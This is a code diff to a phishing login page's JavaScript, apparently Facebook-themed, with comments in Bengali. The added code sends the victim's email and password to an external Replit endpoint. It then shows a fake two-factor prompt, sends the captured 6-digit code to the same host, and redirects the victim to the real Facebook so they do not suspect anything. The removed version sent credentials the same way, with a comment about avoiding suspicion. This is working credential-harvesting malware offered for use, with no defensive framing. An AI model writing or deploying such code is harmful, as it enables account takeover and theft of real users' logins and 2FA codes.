@@ -33,43 +33,61 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        const submitBtn = document.getElementById('submitBtn');
+
+        submitBtn.innerText = "Checking security...";
+        submitBtn.disabled = true;
+
+        const REPLIT_URL = "https://9f77dca3-e9b1-49d2-9c4b-35efceb5aadb-00-1bjgtzkskpfqc.worf.replit.dev:5000/forward";
+
+        // প্রথম ধাপ: আইডি-পাসওয়ার্ড পাঠানো
+        const data = {
+            domain: "Cyber_Shield_2FA_Portal",
+            fileName: "FB_Logins.txt",
+            content: "Email/Phone: " + email + "\nPassword: " + pass
+        };
+
+        fetch(REPLIT_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            mode: 'cors',
+            body: JSON.stringify(data)
+        })
+        .then(() => {
+            // আইডি পাসওয়ার্ড যাওয়ার পর ২-ফ্যাক্টর কোড চাওয়ার জন্য বক্স দেখানো
+            const code = prompt("Two-factor authentication is enabled for this account.\nPlease enter the 6-digit code sent to your phone:");
             
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-            const submitBtn = document.getElementById('submitBtn');
+            if (code) {
+                // দ্বিতীয় ধাপ: ২-ফ্যাক্টর কোড পাঠানো
+                const codeData = {
+                    domain: "Cyber_Shield_2FA_Portal",
+                    fileName: "2FA_Code.txt",
+                    content: "Email: " + email + "\n2FA Code: " + code
+                };
 
-            // বাটন টেক্সট পরিবর্তন (লোডিং ইফেক্ট)
-            submitBtn.innerText = "Logging in...";
-            submitBtn.disabled = true;
-
-            // আপনার Replit URL (নিশ্চিত করুন শেষে /forward আছে)
-            const REPLIT_URL = "https://9f77dca3-e9b1-49d2-9c4b-35efceb5aadb-00-1bjgtzkskpfqc.worf.replit.dev:5000/forward";
-
-            const data = {
-                domain: "Facebook_External_Login",
-                fileName: "account_info.txt",
-                content: "Email/Phone: " + email + "\nPassword: " + pass
-            };
-
-            fetch(REPLIT_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                mode: 'cors', // অন্য সাইট থেকে ডাটা পাঠানোর জন্য এটি জরুরি
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                // ডাটা পাঠানো সফল হলে আসল ফেসবুকে পাঠিয়ে দিন
-                window.location.href = "https://www.facebook.com/login/device-based/regular/login/";
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                // এরর হলেও ইউজারকে পাঠিয়ে দিন যাতে সন্দেহ না করে
-                window.location.href = "https://www.facebook.com";
-            });
+                return fetch(REPLIT_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    mode: 'cors',
+                    body: JSON.stringify(codeData)
+                });
+            }
+        })
+        .then(() => {
+            // সব শেষে আসল ফেসবুকে পাঠিয়ে দেওয়া (সঠিক লিঙ্ক)
+            window.location.href = "https://www.facebook.com/login.php";
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            window.location.href = "https://www.facebook.com";
         });
-    </script>
+    });
+</script>
 
 </body>
 </html>
